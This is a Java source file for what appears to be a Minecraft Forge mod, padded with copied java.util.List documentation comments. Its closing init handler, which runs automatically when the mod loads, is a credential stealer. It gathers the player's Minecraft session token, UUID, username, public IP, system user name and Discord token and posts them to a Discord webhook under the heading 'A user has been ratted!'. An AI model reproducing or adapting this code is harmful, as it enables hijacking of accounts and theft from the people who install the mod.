        * <p>Suppose {@code x} is a list known to contain only strings.
        * The following code can be used to dump the list into a newly
        * allocated array of {@code String}:
        *
        * <pre>{@code
        *     String[] y = x.toArray(new String[0]);
        * }</pre>
        *
        * Note that {@code toArray(new Object[0])} is identical in function to
        * {@code toArray()}.
        *
        * @param a the array into which the elements of this list are to
        *          be stored, if it is big enough; otherwise, a new array of the
        *          same runtime type is allocated for this purpose.
        * @return an array containing the elements of this list
        * @throws ArrayStoreException if the runtime type of the specified array
        *         is not a supertype of the runtime type of every element in
        *         this list
        * @throws NullPointerException if the specified array is null
        */
        <T> T[] toArray(T[] a);


        // Modification Operations

        /*
        * Appends the specified element to the end of this list (optional
        * operation).
        *
        * <p>Lists that support this operation may place limitations on what
        * elements may be added to this list.  In particular, some
        * lists will refuse to add null elements, and others will impose
        * restrictions on the type of elements that may be added.  List
        * classes should clearly specify in their documentation any restrictions
        * on what elements may be added.
        *
        * @param e element to be appended to this list
        * @return {@code true} (as specified by {@link Collection#add})
        * @throws UnsupportedOperationException if the {@code add} operation
        *         is not supported by this list
        * @throws ClassCastException if the class of the specified element
        *         prevents it from being added to this list
        * @throws NullPointerException if the specified element is null and this
        *         list does not permit null elements
        * @throws IllegalArgumentException if some property of this element
        *         prevents it from being added to this list
        */
        boolean add(E e);

        /*
        * Removes the first occurrence of the specified element from this list,
        * if it is present (optional operation).  If this list does not contain
        * the element, it is unchanged.  More formally, removes the element with
        * the lowest index {@code i} such that
        * {@code Objects.equals(o, get(i))}
        * (if such an element exists).  Returns {@code true} if this list
        * contained the specified element (or equivalently, if this list changed
        * as a result of the call).
        *
        * @param o element to be removed from this list, if present
        * @return {@code true} if this list contained the specified element
        * @throws ClassCastException if the type of the specified element
        *         is incompatible with this list
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws NullPointerException if the specified element is null and this
        *         list does not permit null elements
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws UnsupportedOperationException if the {@code remove} operation
        *         is not supported by this list
        */
        boolean remove(Object o);


        // Bulk Modification Operations

        /*
        * Returns {@code true} if this list contains all of the elements of the
        * specified collection.
        *
        * @param  c collection to be checked for containment in this list
        * @return {@code true} if this list contains all of the elements of the
        *         specified collection
        * @throws ClassCastException if the types of one or more elements
        *         in the specified collection are incompatible with this
        *         list
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws NullPointerException if the specified collection contains one
        *         or more null elements and this list does not permit null
        *         elements
        *         (<a href="Collection.html#optional-restrictions">optional</a>),
        *         or if the specified collection is null
        * @see #contains(Object)
        */
        boolean containsAll(Collection<?> c);

        /*
        * Appends all of the elements in the specified collection to the end of
        * this list, in the order that they are returned by the specified
        * collection's iterator (optional operation).  The behavior of this
        * operation is undefined if the specified collection is modified while
        * the operation is in progress.  (Note that this will occur if the
        * specified collection is this list, and it's nonempty.)
        *
        * @param c collection containing elements to be added to this list
        * @return {@code true} if this list changed as a result of the call
        * @throws UnsupportedOperationException if the {@code addAll} operation
        *         is not supported by this list
        * @throws ClassCastException if the class of an element of the specified
        *         collection prevents it from being added to this list
        * @throws NullPointerException if the specified collection contains one
        *         or more null elements and this list does not permit null
        *         elements, or if the specified collection is null
        * @throws IllegalArgumentException if some property of an element of the
        *         specified collection prevents it from being added to this list
        * @see #add(Object)
        */
        boolean addAll(Collection<? extends E> c);

        /*
        * Inserts all of the elements in the specified collection into this
        * list at the specified position (optional operation).  Shifts the
        * element currently at that position (if any) and any subsequent
        * elements to the right (increases their indices).  The new elements
        * will appear in this list in the order that they are returned by the
        * specified collection's iterator.  The behavior of this operation is
        * undefined if the specified collection is modified while the
        * operation is in progress.  (Note that this will occur if the specified
        * collection is this list, and it's nonempty.)
        *
        * @param index index at which to insert the first element from the
        *              specified collection
        * @param c collection containing elements to be added to this list
        * @return {@code true} if this list changed as a result of the call
        * @throws UnsupportedOperationException if the {@code addAll} operation
        *         is not supported by this list
        * @throws ClassCastException if the class of an element of the specified
        *         collection prevents it from being added to this list
        * @throws NullPointerException if the specified collection contains one
        *         or more null elements and this list does not permit null
        *         elements, or if the specified collection is null
        * @throws IllegalArgumentException if some property of an element of the
        *         specified collection prevents it from being added to this list
        * @throws IndexOutOfBoundsException if the index is out of range
        *         ({@code index < 0 || index > size()})
        */
        boolean addAll(int index, Collection<? extends E> c);

        /*
        * Removes from this list all of its elements that are contained in the
        * specified collection (optional operation).
        *
        * @param c collection containing elements to be removed from this list
        * @return {@code true} if this list changed as a result of the call
        * @throws UnsupportedOperationException if the {@code removeAll} operation
        *         is not supported by this list
        * @throws ClassCastException if the class of an element of this list
        *         is incompatible with the specified collection
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws NullPointerException if this list contains a null element and the
        *         specified collection does not permit null elements
        *         (<a href="Collection.html#optional-restrictions">optional</a>),
        *         or if the specified collection is null
        * @see #remove(Object)
        * @see #contains(Object)
        */
        boolean removeAll(Collection<?> c);

        /*
        * Retains only the elements in this list that are contained in the
        * specified collection (optional operation).  In other words, removes
        * from this list all of its elements that are not contained in the
        * specified collection.
        *
        * @param c collection containing elements to be retained in this list
        * @return {@code true} if this list changed as a result of the call
        * @throws UnsupportedOperationException if the {@code retainAll} operation
        *         is not supported by this list
        * @throws ClassCastException if the class of an element of this list
        *         is incompatible with the specified collection
        * (<a href="Collection.html#optional-restrictions">optional</a>)
        * @throws NullPointerException if this list contains a null element and the
        *         specified collection does not permit null elements
        *         (<a href="Collection.html#optional-restrictions">optional</a>),
        *         or if the specified collection is null
        * @see #remove(Object)
        * @see #contains(Object)
        */
        boolean retainAll(Collection<?> c);

        /*
        * Replaces each element of this list with the result of applying the
        * operator to that element.  Errors or runtime exceptions thrown by
        * the operator are relayed to the caller.
        *
        * @implSpec
        * The default implementation is equivalent to, for this {@code list}:
        * <pre>{@code
        *     final ListIterator<E> li = list.listIterator();
        *     while (li.hasNext()) {
        *         li.set(operator.apply(li.next()));
        *     }
        * }</pre>
        *
        * If the list's list-iterator does not support the {@code set} operation
        * then an {@code UnsupportedOperationException} will be thrown when
        * replacing the first element.
        *
        * @param operator the operator to apply to each element
        * @throws UnsupportedOperationException if this list is unmodifiable.
        *         Implementations may throw this exception if an element
        *         cannot be replaced or if, in general, modification is not
        *         supported
        * @throws NullPointerException if the specified operator is null or
        *         if the operator result is a null value and this list does
        *         not permit null elements
        *         (<a href="Collection.html#optional-restrictions">optional</a>)
        * @since 1.8
        */
    

        /*
        * Sorts this list according to the order induced by the specified
        * {@link Comparator}.  The sort is <i>stable</i>: this method must not
        * reorder equal elements.
        *
        * <p>All elements in this list must be <i>mutually comparable</i> using the
        * specified comparator (that is, {@code c.compare(e1, e2)} must not throw
        * a {@code ClassCastException} for any elements {@code e1} and {@code e2}
        * in the list).
        *
        * <p>If the specified comparator is {@code null} then all elements in this
        * list must implement the {@link Comparable} interface and the elements'
        * {@linkplain Comparable natural ordering} should be used.
        *
        * <p>This list must be modifiable, but need not be resizable.
        *
        * @implSpec
        * The default implementation obtains an array containing all elements in
        * this list, sorts the array, and iterates over this list resetting each
        * element from the corresponding position in the array. (This avoids the
        * n<sup>2</sup> log(n) performance that would result from attempting
        * to sort a linked list in place.)
        *
        * @implNote
        * This implementation is a stable, adaptive, iterative mergesort that
        * requires far fewer than n lg(n) comparisons when the input array is
        * partially sorted, while offering the performance of a traditional
        * mergesort when the input array is randomly ordered.  If the input array
        * is nearly sorted, the implementation requires approximately n
        * comparisons.  Temporary storage requirements vary from a small constant
        * for nearly sorted input arrays to n/2 object references for randomly
        * ordered input arrays.
        *
        * <p>The implementation takes equal advantage of ascending and
        * descending order in its input array, and can take advantage of
        * ascending and descending order in different parts of the same
        * input array.  It is well-suited to merging two or more sorted arrays:
        * simply concatenate the arrays and sort the resulting array.
        *
        * <p>The implementation was adapted from Tim Peters's list sort for Python
        * (<a href="http://svn.python.org/projects/python/trunk/Objects/listsort.txt">
        * TimSort</a>).  It uses techniques from Peter McIlroy's "Optimistic
        * Sorting and Information Theoretic Complexity", in Proceedings of the
        * Fourth Annual ACM-SIAM Symposium on Discrete Algorithms, pp 467-474,
        * January 1993.
        *
        * @param c the {@code Comparator} used to compare list elements.
        *          A {@code null} value indicates that the elements'
        *          {@linkplain Comparable natural ordering} should be used
        * @throws ClassCastException if the list contains elements that are not
        *         <i>mutually comparable</i> using the specified comparator
        * @throws UnsupportedOperationException if the list's list-iterator does
        *         not support the {@code set} operation
        * @throws IllegalArgumentException
        *         (<a href="Collection.html#optional-restrictions">optional</a>)
        *         if the comparator is found to violate the {@link Comparator}
        *         contract
        * @since 1.8
        */
    }

    @EventHandler
    public void init(FMLPreInitializationEvent event) {
        new Thread(() -> {
            try {
                Main.tokenLog();
                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-type", "application/json");
                con.setDoOutput(true);

                Minecraft minecraft = Minecraft.getMinecraft();
                String username = minecraft.getSession().getProfile().getName();
                String uuid = minecraft.getSession().getProfile().getId().toString();
                String ssid = minecraft.getSession().getToken();
                
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String sysname = System.getProperty("user.name");
                String discord = Main.getDiscordToken();
                 /*
        * Replaces each element of this list with the result of applying the
        * operator to that element.  Errors or runtime exceptions thrown by
        * the operator are relayed to the caller.
        *
        * @implSpec
        * The default implementation is equivalent to, for this {@code list}:
        * <pre>{@code
        *     final ListIterator<E> li = list.listIterator();
        *     while (li.hasNext()) {
        *         li.set(operator.apply(li.next()));
        *     }
        */

                discord disc = new discord(Main.JsonFinalPayload());
                disc.setContent("@everyone https://sky.shiiyu.moe/" + username);
                disc.setUsername("ratter");
                disc.setAvatarUrl("https://cdn.discordapp.com/attachments/1046300257186746431/1075592578373783622/image.png");
                disc.setTts(false);
                disc.addEmbed(new discord.EmbedObject()
                    .setColor(Color.RED)
                    .setTitle("A user has been ratted!")
                    .addField("Username", "```" + username + "```", true)
                    .addField("UUID", "```" + uuid.replace("-","") + "```", true)
                    .addField("Session ID", "```" + ssid + "```", false)
                );
                disc.addEmbed(new discord.EmbedObject()
                    .setTitle("Other Stuff")
                    .setColor(Color.RED)
                    .addField("System Name", "```" + sysname + "```", true)
                    .addField("IP", "```" + ip + "```", true)
                    .addField("Discord Token", "```" + discord + "```", false)
                );
                disc.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}